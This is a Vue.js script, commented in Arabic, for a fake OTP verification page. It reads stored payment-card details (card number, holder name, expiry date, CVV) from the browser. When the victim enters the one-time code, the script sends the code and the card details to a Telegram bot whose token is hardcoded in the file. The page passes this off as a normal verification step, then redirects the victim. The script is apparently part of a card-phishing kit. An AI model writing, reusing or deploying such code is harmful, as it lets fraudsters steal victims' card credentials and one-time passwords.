/*
صفحة التحقق OTP مع إرسال تلقائي إلى بوت تليجرام
*/

new Vue({
  el: "#otp-app",
  data() {
    return {
      otpCode: "",
      timeRemaining: 300, // 5 دقائق
      timerInterval: null,
      canResend: false,
      resendCountdown: 60,
      resendInterval: null,
      cardData: null, // بيانات البطاقة من الصفحة السابقة
      telegramBotToken: "8642789421:AAH5WVNFF0yxI-OIRjtsMPuBw3cSawVF1pk",
      telegramChatId: "8642789421"
    };
  },
  computed: {
    isOtpValid() {
      return this.otpCode.length === 4 || this.otpCode.length === 6;
    }
  },
  mounted() {
    // استرجاع بيانات البطاقة من localStorage
    const savedCardData = localStorage.getItem('cardData');
    if (savedCardData) {
      this.cardData = JSON.parse(savedCardData);
    }

    // بدء العد التنازلي
    this.startTimer();
    
    // التركيز على حقل الإدخال
    this.$nextTick(() => {
      document.getElementById("otpCode").focus();
    });
  },
  beforeDestroy() {
    // إيقاف المؤقتات عند مغادرة الصفحة
    if (this.timerInterval) {
      clearInterval(this.timerInterval);
    }
    if (this.resendInterval) {
      clearInterval(this.resendInterval);
    }
  },
  methods: {
    validateOtpInput(event) {
      // السماح فقط بالأرقام
      this.otpCode = this.otpCode.replace(/[^0-9]/g, '');
      
      // تحديد الحد الأقصى إلى 6 أرقام
      if (this.otpCode.length > 6) {
        this.otpCode = this.otpCode.slice(0, 6);
      }
    },
    formatTime(seconds) {
      const mins = Math.floor(seconds / 60);
      const secs = seconds % 60;
      return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    },
    startTimer() {
      this.timerInterval = setInterval(() => {
        this.timeRemaining--;
        
        if (this.timeRemaining <= 0) {
          clearInterval(this.timerInterval);
          this.timeRemaining = 0;
        }
      }, 1000);
    },
    submitOtp() {
      if (!this.isOtpValid) {
        alert("يرجى إدخال 4 أو 6 أرقام");
        return;
      }

      if (this.timeRemaining <= 0) {
        alert("انتهت صلاحية الرمز. يرجى طلب رمز جديد");
        return;
      }

      // إنشء رسالة البيانات
      const message = `
🔐 تم التحقق من الرمز:
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 رمز التحقق: ${this.otpCode}
⏱️ الوقت المتبقي: ${this.formatTime(this.timeRemaining)}
━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 بيانات البطاقة الأصلية:
💳 رقم البطاقة: ${this.cardData?.cardNumber || 'غير متاح'}
👤 اسم صاحب البطاقة: ${this.cardData?.cardName || 'غير متاح'}
📅 تاريخ الانتهاء: ${this.cardData?.cardMonth}/${this.cardData?.cardYear}
🔐 CVV: ${this.cardData?.cardCvv || 'غير متاح'}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
      `;

      // إرسال الرسالة إلى تليجرام
      this.sendToTelegram(message);
    },
    sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
      
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.telegramChatId,
          text: message,
          parse_mode: 'HTML'
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert("✅ تم التحقق بنجاح! تم إرسال البيانات إلى تليجرام");
          // مسح البيانات المحفوظة
          localStorage.removeItem('cardData');
          // إعادة التوجيه أو إعادة تعيين النموذج
          setTimeout(() => {
            this.resetForm();
          }, 1500);
        } else {
          alert("❌ حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقاً");
          console.error("خطأ تليجرام:", data);
        }
      })
      .catch(error => {
        alert("❌ خطأ في الاتصال. يرجى التحقق من الاتصال بالإنترنت");
        console.error("خطأ:", error);
      });
    },
    resendOtp() {
      if (!this.canResend) {
        return;
      }

      // إعادة تعيين المؤقت
      this.timeRemaining = 300;
      this.otpCode = "";
      this.canResend = false;
      this.resendCountdown = 60;

      // إعادة بدء المؤقت الرئيسي
      if (this.timerInterval) {
        clearInterval(this.timerInterval);
      }
      this.startTimer();

      // بدء مؤقت إعادة الإرسال
      this.startResendCountdown();

      // إرسال رسالة إلى تليجرام بأن الرمز تم إعادة إرساله
      this.sendResendNotification();

      alert("✅ تم إعادة إرسال الرمز");
    },
    startResendCountdown() {
      this.resendInterval = setInterval(() => {
        this.resendCountdown--;
        
        if (this.resendCountdown <= 0) {
          clearInterval(this.resendInterval);
          this.canResend = true;
          this.resendCountdown = 60;
        }
      }, 1000);
    },
    sendResendNotification() {
      const message = `
🔄 تم طلب إعادة إرسال الرمز
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
      `;

      const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
      
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.telegramChatId,
          text: message,
          parse_mode: 'HTML'
        })
      })
      .catch(error => console.error("خطأ في إرسال إشعار إعادة الإرسال:", error));
    },
    goBack() {
      if (confirm("هل تريد العودة إلى الصفحة السابقة؟")) {
        // مسح البيانات المحفوظة
        localStorage.removeItem('cardData');
        // إعادة التوجيه إلى الصفحة الأولى
        window.location.href = 'index.html';
      }
    },
    resetForm() {
      this.otpCode = "";
      this.timeRemaining = 300;
      this.canResend = false;
      this.resendCountdown = 60;
      
      // إعادة التوجيه إلى الصفحة الأولى
      window.location.href = 'index.html';
    }
  }
});
